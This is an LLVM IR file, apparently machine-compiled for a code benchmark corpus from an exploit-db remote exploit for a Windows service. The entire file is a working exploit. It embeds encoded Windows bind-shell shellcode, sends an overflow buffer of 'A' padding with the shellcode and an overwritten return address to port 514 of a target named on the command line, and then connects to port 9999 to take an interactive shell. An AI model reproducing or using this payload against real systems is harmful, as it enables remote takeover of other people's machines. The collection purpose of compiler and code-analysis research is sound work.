; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_4222.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_4222.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { %struct.TYPE_2__, i8*, i8* }
%struct.TYPE_2__ = type { i32 }
%struct.hostent = type { i8* }
%struct.sockaddr = type { i32 }

@__const.main.win32_bindshell = private unnamed_addr constant [710 x i8] c"AAAAAAAAAAAAA\EB\03Y\EB\05\E8\F8\FF\FF\FFIIIIIIIIIIIIIIIIIQ7ZjfXP0A1BAkAAvA2AA2BA0BAXP8ABuyyKL2JzKBmxhL9KOKOKOu0nkBLEtq4lKAUWLNk3LS5QhUQhoLKroVxnkaOwPva8kRiNk6TNkgqJNvQO0mINLMTKpAdC7KqkzvmTAO2zKjTEk3dVDwX45kULKaOFDUQXk1vlKFl0KNkaOuLdA8kS3TlLKmYPlddUL0akstqKkQtLKQSp0LKw06lLKrP5LNMlKspWx1NBHNnPNvnZL0PkOIFu6V3SVu87C4r58t7T3DrcoqDKOzpBH8K8mkLGK0PKON6QOOyM5BFK1zM38Wrv5azFbKOn0QxKigyYelmAGKOn6ACV3v3RspSQSpS2c2skON0AvbH6GTOAvrsOyIqNu1xnDgjd0O7pWion6pjtPbqseKO8PbHLdNMdnXibwKOzvPSQE9oXPqxkUSyovSy679oyFrpaD3dbuYoHPJ3Qxm7qiyVqipWkOn6QEion0E6cZAt56rH0cPmoyYucZRpCi7YXLOyywRJ3tMY9rUaO0zSmzynG2vMinG24lmClMrZTxNKLklku8RRKNNSUFyoqeATYoN6CkqGQBRqbqRqQz31V1F1QEPQYoN0PhLmn9S5jnbsIoZvPjYoKO4wYoZplK2w9llCKtatkOjvPRyon0BHzOjnYpcPBsKOHVyoN0f\00", align 16
@.str = private unnamed_addr constant [19 x i8] c"usage: %s address\0A\00", align 1
@AF_INET = common dso_local global i8* null, align 8
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"bind\00", align 1
@EADDRNOTAVAIL = common dso_local global i32 0, align 4
@errno = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [6 x i8] c"error\00", align 1
@ESIZ = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [6 x i8] c"\00A\00A\00\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [710 x i8], align 16
  %7 = alloca i8*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca %struct.sockaddr_in, align 8
  %13 = alloca %struct.hostent*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %14 = bitcast [710 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %14, i8* align 16 getelementptr inbounds ([710 x i8], [710 x i8]* @__const.main.win32_bindshell, i32 0, i32 0), i64 710, i1 false)
  %15 = load i32, i32* %4, align 4
  %16 = icmp slt i32 %15, 2
  br i1 %16, label %17, label %23

17:                                               ; preds = %2
  %18 = load i8**, i8*** %5, align 8
  %19 = getelementptr inbounds i8*, i8** %18, i64 0
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0), i8* %20)
  %22 = call i32 @exit(i32 -1) #4
  unreachable

23:                                               ; preds = %2
  %24 = load i8*, i8** @AF_INET, align 8
  %25 = load i32, i32* @SOCK_STREAM, align 4
  %26 = call i32 @socket(i8* %24, i32 %25, i32 0)
  store i32 %26, i32* %11, align 4
  %27 = call i32 @bzero(%struct.sockaddr_in* %12, i32 24)
  %28 = load i8*, i8** @AF_INET, align 8
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i8* %28, i8** %29, align 8
  %30 = call i8* @htons(i32 514)
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i8* %30, i8** %31, align 8
  %32 = load i32, i32* %11, align 4
  %33 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %34 = call i64 @bind(i32 %32, %struct.sockaddr* %33, i32 24)
  %35 = icmp ne i64 0, %34
  br i1 %35, label %36, label %39

36:                                               ; preds = %23
  %37 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  %38 = call i32 @exit(i32 -344) #4
  unreachable

39:                                               ; preds = %23
  %40 = load i8**, i8*** %5, align 8
  %41 = getelementptr inbounds i8*, i8** %40, i64 1
  %42 = load i8*, i8** %41, align 8
  %43 = call i32 @inet_addr(i8* %42)
  %44 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %45 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %44, i32 0, i32 0
  store i32 %43, i32* %45, align 8
  %46 = icmp eq i32 %43, -1
  br i1 %46, label %47, label %65

47:                                               ; preds = %39
  %48 = load i8**, i8*** %5, align 8
  %49 = getelementptr inbounds i8*, i8** %48, i64 1
  %50 = load i8*, i8** %49, align 8
  %51 = call %struct.hostent* @gethostbyname(i8* %50)
  store %struct.hostent* %51, %struct.hostent** %13, align 8
  %52 = icmp eq %struct.hostent* %51, null
  br i1 %52, label %53, label %57

53:                                               ; preds = %47
  %54 = load i32, i32* @EADDRNOTAVAIL, align 4
  store i32 %54, i32* @errno, align 4
  %55 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %56 = call i32 @exit(i32 -1) #4
  unreachable

57:                                               ; preds = %47
  %58 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %59 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %58, i32 0, i32 0
  %60 = bitcast i32* %59 to i8*
  %61 = load %struct.hostent*, %struct.hostent** %13, align 8
  %62 = getelementptr inbounds %struct.hostent, %struct.hostent* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = call i32 (i8*, ...) @memcpy(i8* %60, i8* %63, i32 4)
  br label %65

65:                                               ; preds = %57, %39
  %66 = load i32, i32* %11, align 4
  %67 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %68 = call i64 @connect(i32 %66, %struct.sockaddr* %67, i32 24)
  %69 = icmp slt i64 %68, 0
  br i1 %69, label %70, label %73

70:                                               ; preds = %65
  %71 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %72 = call i32 @exit(i32 -1) #4
  unreachable

73:                                               ; preds = %65
  %74 = load i32, i32* @ESIZ, align 4
  %75 = call i8* @malloc(i32 %74)
  store i8* %75, i8** %7, align 8
  %76 = load i8*, i8** %7, align 8
  %77 = call i32 (i8*, ...) @memcpy(i8* %76, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.3, i64 0, i64 0), i32 5)
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr inbounds i8, i8* %78, i64 5
  %80 = call i32 @memset(i8* %79, i32 65, i32 1028)
  %81 = load i8*, i8** %7, align 8
  %82 = getelementptr inbounds i8, i8* %81, i64 5
  %83 = getelementptr inbounds [710 x i8], [710 x i8]* %6, i64 0, i64 0
  %84 = call i32 (i8*, ...) @memcpy(i8* %82, i8* %83, i64 709)
  %85 = load i8*, i8** %7, align 8
  %86 = getelementptr inbounds i8, i8* %85, i64 5
  %87 = getelementptr inbounds i8, i8* %86, i64 1024
  %88 = bitcast i8* %87 to i32*
  store i32* %88, i32** %8, align 8
  %89 = load i32*, i32** %8, align 8
  store i32 1907242679, i32* %89, align 4
  %90 = load i32, i32* %11, align 4
  %91 = load i8*, i8** %7, align 8
  %92 = load i32, i32* @ESIZ, align 4
  %93 = call i32 @write(i32 %90, i8* %91, i32 %92)
  %94 = load i32, i32* %11, align 4
  %95 = call i32 @close(i32 %94)
  %96 = call i32 @sleep(i32 1)
  %97 = load i8*, i8** @AF_INET, align 8
  %98 = load i32, i32* @SOCK_STREAM, align 4
  %99 = call i32 @socket(i8* %97, i32 %98, i32 0)
  store i32 %99, i32* %11, align 4
  %100 = call i32 @bzero(%struct.sockaddr_in* %12, i32 24)
  %101 = load i8*, i8** @AF_INET, align 8
  %102 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i8* %101, i8** %102, align 8
  %103 = call i8* @htons(i32 9999)
  %104 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  store i8* %103, i8** %104, align 8
  %105 = load i8**, i8*** %5, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 1
  %107 = load i8*, i8** %106, align 8
  %108 = call i32 @inet_addr(i8* %107)
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %110 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %109, i32 0, i32 0
  store i32 %108, i32* %110, align 8
  %111 = icmp eq i32 %108, -1
  br i1 %111, label %112, label %130

112:                                              ; preds = %73
  %113 = load i8**, i8*** %5, align 8
  %114 = getelementptr inbounds i8*, i8** %113, i64 1
  %115 = load i8*, i8** %114, align 8
  %116 = call %struct.hostent* @gethostbyname(i8* %115)
  store %struct.hostent* %116, %struct.hostent** %13, align 8
  %117 = icmp eq %struct.hostent* %116, null
  br i1 %117, label %118, label %122

118:                                              ; preds = %112
  %119 = load i32, i32* @EADDRNOTAVAIL, align 4
  store i32 %119, i32* @errno, align 4
  %120 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %121 = call i32 @exit(i32 -1) #4
  unreachable

122:                                              ; preds = %112
  %123 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %124 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %123, i32 0, i32 0
  %125 = bitcast i32* %124 to i8*
  %126 = load %struct.hostent*, %struct.hostent** %13, align 8
  %127 = getelementptr inbounds %struct.hostent, %struct.hostent* %126, i32 0, i32 0
  %128 = load i8*, i8** %127, align 8
  %129 = call i32 (i8*, ...) @memcpy(i8* %125, i8* %128, i32 4)
  br label %130

130:                                              ; preds = %122, %73
  %131 = load i32, i32* %11, align 4
  %132 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %133 = call i64 @connect(i32 %131, %struct.sockaddr* %132, i32 24)
  %134 = icmp slt i64 %133, 0
  br i1 %134, label %135, label %138

135:                                              ; preds = %130
  %136 = call i32 @perror(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.2, i64 0, i64 0))
  %137 = call i32 @exit(i32 -1) #4
  unreachable

138:                                              ; preds = %130
  %139 = load i32, i32* %11, align 4
  %140 = call i32 @do_shell(i32 %139)
  %141 = load i32, i32* %3, align 4
  ret i32 %141
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, i8*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @socket(i8*, i32, i32) #2

declare dso_local i32 @bzero(%struct.sockaddr_in*, i32) #2

declare dso_local i8* @htons(i32) #2

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @inet_addr(i8*) #2

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @memcpy(i8*, ...) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @do_shell(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
